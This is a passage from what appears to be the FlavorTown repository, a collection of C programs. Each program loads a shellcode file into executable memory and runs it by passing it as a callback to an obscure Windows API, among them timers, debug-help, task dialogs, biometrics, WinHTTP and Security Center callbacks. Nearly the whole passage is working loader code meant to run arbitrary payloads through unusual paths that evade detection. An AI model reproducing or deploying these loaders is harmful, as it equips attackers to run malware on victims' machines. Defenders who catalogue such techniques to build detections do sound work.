	sBI.pidlRoot = NULL;
	sBI.pszDisplayName = L"Wra7h";
	sBI.lpszTitle = L"h7arW";
	sBI.ulFlags = 0;
	sBI.lpfn = (BFFCALLBACK)hAlloc;

	SHBrowseForFolder(&sBI);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/SHCreateThreadWithHandle.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Shlwapi.lib")

#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;
	
	HANDLE hThread = NULL;

	if (argc != 2)
	{
		printf("Usage: SHCreateThreadWithHandle.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	SHCreateThreadWithHandle(hAlloc, NULL, NULL, NULL, &hThread);
	WaitForSingleObject(hThread, INFINITE);
	
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hThread)
		CloseHandle(hThread);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/SetWaitableTimer.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: SetWaitableTimer.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	LARGE_INTEGER sLI = { 0 };
	HANDLE hTimer = CreateWaitableTimer(NULL, FALSE, NULL);
	SetWaitableTimer(hTimer, &sLI, 0x0, (PTIMERAPCROUTINE) hAlloc, NULL, FALSE);
	SleepEx(1000, TRUE);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/SetupInstallFile.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Setupapi.lib")

#include <stdio.h>
#include <windows.h>
#include <setupapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: SetupInstallFile.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	//Create a file
	HANDLE hFile = CreateFile(L"C:\\Windows\\Temp\\Blank.txt", GENERIC_WRITE,
		0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	CloseHandle(hFile);

	//SP_COPY_NOOVERWRITE = "Check whether the target file exists, and, if so, notify the caller who may veto the copy."
	SetupInstallFile(NULL, NULL, L"C:\\Windows\\notepad.exe", NULL,
		L"C:\\Windows\\Temp\\Blank.txt",
		SP_COPY_NOOVERWRITE | SP_COPY_NEWER_OR_SAME | SP_COPY_SOURCE_ABSOLUTE,
		hAlloc, NULL);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/SetupIterateCabinet.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file> <cabinet file>
#pragma comment(lib, "setupapi.lib")

#include <stdio.h>
#include <windows.h>
#include <setupapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 3)
	{
		printf("Usage: SetupIterateCabinet.exe C:\\Path\\To\\Shellcode.bin C:\\Path\\To\\A\\Cabinet.cab");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	SetupIterateCabinet(argv[2], 0, (PSP_FILE_CALLBACK)hAlloc, NULL);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/StackWalk.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "DbgHelp.lib")

#include <stdio.h>
#include <Windows.h>
#include <dbghelp.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: StackWalk.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	STACKFRAME sStackFrame = { 0 };
	CONTEXT sContext = { 0 };

	StackWalk(
		IMAGE_FILE_MACHINE_AMD64, // MachineType
		GetCurrentProcess(), // hProcess
		NULL, // hThread
		&sStackFrame, // A pointer to a STACKFRAME64 structure. This structure receives information for the next frame
		&sContext, // A pointer to a CONTEXT structure.
		NULL, // ReadMemoryRoutine
		(PFUNCTION_TABLE_ACCESS_ROUTINE)hAlloc, // FunctionTableAccessRoutine
		NULL, // GetModuleBaseRoutine
		NULL); //TranslateAddress


CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/SymRegisterCallback.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "DbgHelp.lib")

#include <stdio.h>
#include <Windows.h>
#include <dbghelp.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: SymRegisterCallback.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	SymInitialize(GetCurrentProcess(), NULL, FALSE);
	SymRegisterCallback(GetCurrentProcess(), (PSYMBOL_REGISTERED_CALLBACK)hAlloc, NULL);
	SymRefreshModuleList(GetCurrentProcess());

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/TaskDialogIndirect.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comctl32.lib")

//https://stackoverflow.com/questions/37016803/calling-taskdialogindirect-loader-says-ordinal-345-not-found
#if defined _M_IX86
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_IA64
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='ia64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_X64
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#else
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif

#include <stdio.h>
#include <Windows.h>
#include <Commctrl.h> 

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;
	
	if (argc != 2)
	{
		printf("Usage: TaskDialogIndirect.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	TASKDIALOGCONFIG sTDC = { 0 };
	sTDC.pfCallback = (PFTASKDIALOGCALLBACK)hAlloc;
	sTDC.cbSize = sizeof(TASKDIALOGCONFIG);
	TaskDialogIndirect(&sTDC, NULL, NULL, NULL);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/TrySubmitThreadpoolCallback.c`:

```c
// NOTE: Works for simple shellcode execution

// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>
#include <threadpoolapiset.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: TrySubmitThreadpoolCallback.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	TrySubmitThreadpoolCallback((PTP_SIMPLE_CALLBACK)hAlloc, NULL, NULL);

	//Sleep 5 seconds
	Sleep(5000);
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/WinBioCaptureSampleWithCallback.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Winbio.lib")

#include <stdio.h>
#include <windows.h>
#include <winbio.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	WINBIO_SESSION_HANDLE hBioSession = NULL;

	if (argc != 2)
	{
		printf("Usage: WinBioCaptureSampleWithCallback.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	WinBioOpenSession(WINBIO_TYPE_FINGERPRINT, WINBIO_POOL_SYSTEM, WINBIO_FLAG_DEFAULT, NULL, 0, WINBIO_DB_DEFAULT, &hBioSession);

	WinBioCaptureSampleWithCallback(hBioSession, WINBIO_PURPOSE_VERIFY, WINBIO_DATA_FLAG_PROCESSED, hAlloc, NULL);

	WinBioWait(hBioSession);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hBioSession)
		WinBioCloseSession(hBioSession);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/WinBioEnrollCaptureWithCallback.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Winbio.lib")

#include <stdio.h>
#include <windows.h>
#include <winbio.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	WINBIO_SESSION_HANDLE hBioSession = NULL;

	if (argc != 2)
	{
		printf("Usage: WinBioEnrollCaptureWithCallback.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	WinBioOpenSession(WINBIO_TYPE_FINGERPRINT, WINBIO_POOL_SYSTEM, WINBIO_FLAG_DEFAULT, NULL, 0, WINBIO_DB_DEFAULT, &hBioSession);

	WinBioEnrollCaptureWithCallback(hBioSession, hAlloc, NULL);

	WinBioWait(hBioSession);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hBioSession)
		WinBioCloseSession(hBioSession);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/WinBioVerifyWithCallback.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Winbio.lib")

#include <stdio.h>
#include <windows.h>
#include <winbio.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	WINBIO_SESSION_HANDLE hBioSession = NULL;

	if (argc != 2)
	{
		printf("Usage: WinBioVerifyWithCallback.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	WinBioOpenSession(WINBIO_TYPE_FINGERPRINT, WINBIO_POOL_SYSTEM, WINBIO_FLAG_DEFAULT, NULL, 0, WINBIO_DB_DEFAULT, &hBioSession);

	WINBIO_IDENTITY sWI = { 0 };

	WinBioVerifyWithCallback(hBioSession, &sWI, WINBIO_ANSI_381_POS_UNKNOWN, hAlloc, NULL);

	WinBioWait(hBioSession);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hBioSession)
		WinBioCloseSession(hBioSession);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/WinHttpSetStatus.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "winhttp.lib")

#include <stdio.h>
#include <Windows.h>
#include <winhttp.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: WinHttpSetStatus.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	HINTERNET hSession = WinHttpOpen(NULL,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	WinHttpSetStatusCallback(hSession,
		(WINHTTP_STATUS_CALLBACK)hAlloc,
		WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS,
		NULL);

	WinHttpConnect(hSession,
		L"localhost",
		INTERNET_DEFAULT_HTTP_PORT,
		0);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

```

`C/WindowsInspectString.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "RuntimeObject.lib")

#include <stdio.h>
#include <windows.h>
#include <winstring.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: WindowsInspectString.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);
	
	UINT32 len = 0;
	UINT_PTR pStringAddr = NULL;
	WindowsInspectString(L"Wra7h", IMAGE_FILE_MACHINE_AMD64, hAlloc, NULL, &len, &pStringAddr);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/WriteEncryptedFileRaw.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hFile = NULL;
	PVOID pContext = NULL;
	DWORD written = 0;

	if (argc != 2)
	{
		printf("Usage: WriteEncryptedFileRaw.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	hFile = CreateFile(L"C:\\Windows\\Temp\\Blank.txt", GENERIC_WRITE,
		0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
		goto CLEANUP;

	char c[] = { 'W','R','A','7','H'};
	WriteFile(hFile, c, sizeof(c), &written, NULL);

	//CloseHandle for EncryptedFileRaw to work
	CloseHandle(hFile);

	OpenEncryptedFileRaw(L"C:\\Windows\\Temp\\Blank.txt", CREATE_FOR_IMPORT, &pContext);
	
	WriteEncryptedFileRaw((PFE_IMPORT_FUNC)hAlloc, NULL, pContext);
	
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (pContext)
		CloseEncryptedFileRaw(pContext);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/WscRegisterForChanges.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Wscapi.lib")

#include <stdio.h>
#include <windows.h>
#include <wscapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hFile = NULL;
	DWORD dwWritten = 0;
	HANDLE hCallbackReg = NULL;

	if (argc != 2)
	{
		printf("Usage: WscRegisterForChanges.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	// Register the callback for execution
	WscRegisterForChanges(NULL, &hCallbackReg, hAlloc, NULL);

	// Create a file containing the eicar test string for Defender to detect
	hFile = CreateFile( L"C:\\Windows\\Temp\\eicar.txt", GENERIC_WRITE,
		0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
		goto CLEANUP;

	char eicar[] = {'X','5','O','!','P','%','@','A','P','[','4','\\','P','Z','X','5','4','(','P','^',')','7','C','C',')','7','}','$','E','I','C','A','R','-','S','T','A','N','D','A','R','D','-','A','N','T','I','V','I','R','U','S','-','T','E','S','T','-','F','I','L','E','!','$','H','+','H','*', '\0'};

	Ret = WriteFile( hFile, eicar,
		sizeof(eicar), &dwWritten, NULL);

	// Close the handle so defender can begin quarantine process.
	CloseHandle(hFile);
	
	//Wait for the execution
	if (Ret)
	{
		Sleep(20 * 1000);
	}
	else
	{
		printf("[!] Failed to write the eicar test string. Exiting...");
	}
	
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hCallbackReg != NULL && hCallbackReg != INVALID_HANDLE_VALUE)
		WscUnRegisterChanges(hCallbackReg);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/acmDriverEnum.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Msacm32.lib")

